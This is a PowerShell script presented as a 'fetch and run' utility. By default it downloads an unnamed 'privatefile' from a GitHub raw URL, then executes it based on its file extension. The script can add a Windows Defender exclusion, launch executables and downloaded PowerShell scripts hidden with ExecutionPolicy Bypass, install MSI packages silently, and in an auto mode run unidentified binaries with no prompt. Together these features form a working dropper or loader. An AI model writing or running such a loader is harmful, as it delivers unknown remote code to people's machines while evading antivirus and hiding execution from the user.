<#
fetch_and_run.ps1
- Downloads a given URL to a local folder
- Optionally installs Go silently (if you want)
- Runs or extracts the downloaded artifact appropriately
- Adds a Defender exclusion for the file/folder optionally (requires admin)
- Logs actions to %TEMP%\download_runner.log

USAGE (interactive):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\fetch_and_run.ps1

USAGE (auto, no prompts):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\fetch_and_run.ps1 -Auto

Edit $remoteUrl below or pass -Url parameter.
#>

param(
    [string]$Url = "",
    [switch]$Auto,               # if true, skip interactive prompts and proceed
    [switch]$InstallGo,          # if true, download & install Go silently (requires admin)
    [string]$DestFolder = "",    # optional output folder
    [switch]$AddDefenderExclusion,# add Defender exclusion for dest folder or downloaded file (requires admin)
    [switch]$RunHidden           # start exe hidden
)

# -------------------------
# Config - edit if needed
# -------------------------
if (-not $Url -or $Url.Trim() -eq "") {
    # default: your GitHub blob -> raw conversion
    # Blob URL: https://github.com/ArthOfficial/TEST/blob/main/privatefile
    # Raw URL becomes:
    $Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile"
}

$LogFile = Join-Path $env:TEMP "download_runner.log"
function Log { param($m) $line = "$(Get-Date -Format o) - $m"; Add-Content -Path $LogFile -Value $line; Write-Output $line }

# Ensure destination folder
if (-not $DestFolder -or $DestFolder.Trim() -eq "") {
    $DestFolder = Join-Path $env:USERPROFILE "Downloads\fetch_and_run"
}
if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null }

# Helper: ensure admin
function Test-IsAdmin { 
    try { (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $false } 
}

# Helper: download file robustly
function Download-File($sourceUrl, $outPath) {
    Log "Downloading $sourceUrl -> $outPath"
    try {
        $wc = New-Object System.Net.WebClient
        # set user agent to avoid some 403 responses
        $wc.Headers.Add("User-Agent","fetch_and_run/1.0")
        $wc.DownloadFile($sourceUrl, $outPath)
        Log "Downloaded successfully"
        return $true
    } catch {
        Log "Download failed: $_"
        return $false
    } finally {
        if ($wc) { $wc.Dispose() }
    }
}

# Helper: run exe (hidden optional)
function Run-Exe($path, $args = "", $hidden = $true) {
    Log "Launching executable: $path $args"
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $path
    $si.Arguments = $args
    $si.UseShellExecute = $false
    if ($hidden) { $si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden }
    [System.Diagnostics.Process]::Start($si) | Out-Null
}

# Helper: add Defender exclusion (folder or file)
function Add-DefenderExclusion($path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot add Defender exclusion: not running as admin"
        return $false
    }
    try {
        Log "Adding Windows Defender exclusion for $path"
        Add-MpPreference -ExclusionPath $path -ErrorAction Stop
        Log "Exclusion added"
        return $true
    } catch {
        Log "Failed to add Defender exclusion: $_"
        return $false
    }
}

# Optional: download & install Go silently (MSI). WARNING: admin required.
function Install-GoSilent {
    if (-not (Test-IsAdmin)) {
        Log "Install-GoSilent: admin required but not admin. Aborting Go install."
        return $false
    }
    # NOTE: we choose a specific Go MSI version — adjust if you want a different version.
    $goVersion = "1.21.7"   # adjust if needed
    $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
    $msiName = "go$goVersion.windows-$arch.msi"
    $msiUrl = "https://go.dev/dl/$msiName"
    $msiPath = Join-Path $DestFolder $msiName

    Log "Downloading Go MSI $msiUrl"
    if (-not (Download-File $msiUrl $msiPath)) { Log "Go MSI download failed"; return $false }

    Log "Starting silent install of Go via msiexec (may prompt UAC)"
    $args = "/i `"$msiPath`" /qn /norestart"
    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru
    if ($proc.ExitCode -eq 0) {
        Log "Go installed successfully"
        return $true
    } else {
        Log "Go msiexec returned exit code $($proc.ExitCode)"
        return $false
    }
}

# -------------------------
# Begin main
# -------------------------
Log "fetch_and_run started. DestFolder: $DestFolder  Url: $Url"

# Convert GitHub blob URL to raw if user passed blob URL
if ($Url -match "github.com/.+/blob/(.+)$") {
    $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
    Log "Detected GitHub blob URL, converted to raw URL: $Url"
}

# Get filename from URL (fallback to timestamp name)
$uri = [System.Uri]$Url
$fname = [System.IO.Path]::GetFileName($uri.AbsolutePath)
if (-not $fname -or $fname.Trim() -eq "") { $fname = "downloaded_item_$(Get-Date -Format yyyyMMddHHmmss)" }
$destPath = Join-Path $DestFolder $fname

# Confirm with user unless Auto
if (-not $Auto) {
    Write-Host "About to download:`n $Url`nTo:`n $destPath`n"
    $do = Read-Host "Proceed? Y/N"
    if ($do.ToUpper() -ne "Y") { Log "User cancelled"; exit 0 }
}

# Download file
if (-not (Download-File $Url $destPath)) {
    Log "Download failed. Exiting."
    exit 1
}

# If user requested Go install
if ($InstallGo) {
    if (-not $Auto) {
        $yn = Read-Host "Install Go on this machine now? This requires admin. Y/N"
        if ($yn.ToUpper() -ne "Y") { Log "Skipped Go install per user"; }
        else { Install-GoSilent | Out-Null }
    } else {
        Install-GoSilent | Out-Null
    }
}

# Add Defender exclusion if requested
if ($AddDefenderExclusion) {
    if ((Test-IsAdmin) -eq $false) {
        Log "Warning: adding Defender exclusion requires admin. Please re-run as admin to add exclusion."
    } else {
        Add-DefenderExclusion $DestFolder | Out-Null
    }
}

# Act depending on file type
$ext = [System.IO.Path]::GetExtension($destPath).ToLowerInvariant()
switch ($ext) {
    ".msi" {
        Log "Detected MSI, will attempt silent install"
        if (-not (Test-IsAdmin)) { Log "MSI install requires admin. Please re-run as Administrator."; break }
        $args = "/i `"$destPath`" /qn /norestart"
        Log "Running: msiexec $args"
        $p = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru
        Log "msiexec exit code: $($p.ExitCode)"
    }
    ".exe" {
        Log "Detected EXE. Will run executable."
        if ($AddDefenderExclusion -and (Test-IsAdmin)) { Add-DefenderExclusion $destPath | Out-Null }
        if ($RunHidden) {
            Run-Exe -path $destPath -args "" -hidden $true
        } else {
            Start-Process -FilePath $destPath
        }
    }
    ".zip" {
        Log "Detected ZIP. Extracting."
        try {
            Expand-Archive -Path $destPath -DestinationPath $DestFolder -Force
            Log "Extracted to $DestFolder"
        } catch {
            Log "ZIP extraction failed: $_"
        }
    }
    ".ps1" {
        Log "Detected PowerShell script. Running with Bypass."
        if (-not $Auto) { $r = Read-Host "Run the downloaded PS1 now? Y/N"; if ($r.ToUpper() -ne "Y") { Log "Skipped running PS1"; break } }
        $cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -File `"$destPath`""
        Log "Executing: $cmd"
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass","-NoProfile","-File",$destPath -WindowStyle Hidden
    }
    default {
        Log "Unknown extension ($ext). Leaving file downloaded at $destPath"
        # If it's likely an executable binary without extension, optionally attempt to run
        if ($Auto) {
            Log "Auto-mode: attempting to run file regardless."
            try {
                Run-Exe -path $destPath -hidden:$RunHidden
            } catch { Log "Auto-run failed: $_" }
        } else {
            Write-Host "Downloaded file to $destPath"
        }
    }
}

Log "fetch_and_run finished."
